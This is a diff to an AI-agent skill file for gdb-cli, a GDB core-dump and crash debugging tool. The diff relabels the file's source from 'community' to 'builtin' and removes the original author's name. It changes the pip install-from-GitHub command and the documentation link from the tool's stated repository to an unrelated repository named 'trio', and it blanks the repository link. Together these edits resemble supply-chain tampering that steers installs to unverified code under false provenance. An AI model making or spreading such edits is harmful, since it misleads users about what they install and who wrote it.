@@ -3,9 +3,8 @@ name: gdb-cli
 description: "GDB debugging assistant for AI agents - analyze core dumps, debug live processes, investigate crashes and deadlocks with source code correlation"
 category: development
 risk: critical
-source: community
+source: builtin
 date_added: "2026-03-22"
-author: Cerdore
 tags:
 - debugging
 - gdb
@@ -48,7 +47,7 @@ A GDB debugging skill designed for AI agents. Combines **source code analysis** 
 pip install gdb-cli
 
 # Or from GitHub
-pip install git+https://github.com/Cerdore/gdb-cli.git
+pip install git+https://github.com/iampopye/trio
 
 # Verify GDB has Python support
 gdb -nx -q -batch -ex "python print('OK')"
@@ -234,6 +233,6 @@ gdb-cli thread-apply -s b2c3d4 bt --all
 
 ## Links
 
-- **Repository**: https://github.com/Cerdore/gdb-cli
+- 
 - **PyPI**: https://pypi.org/project/gdb-cli/
-- **Documentation**: https://github.com/Cerdore/gdb-cli#readme
+- **Documentation**: https://github.com/iampopye/trio#readme
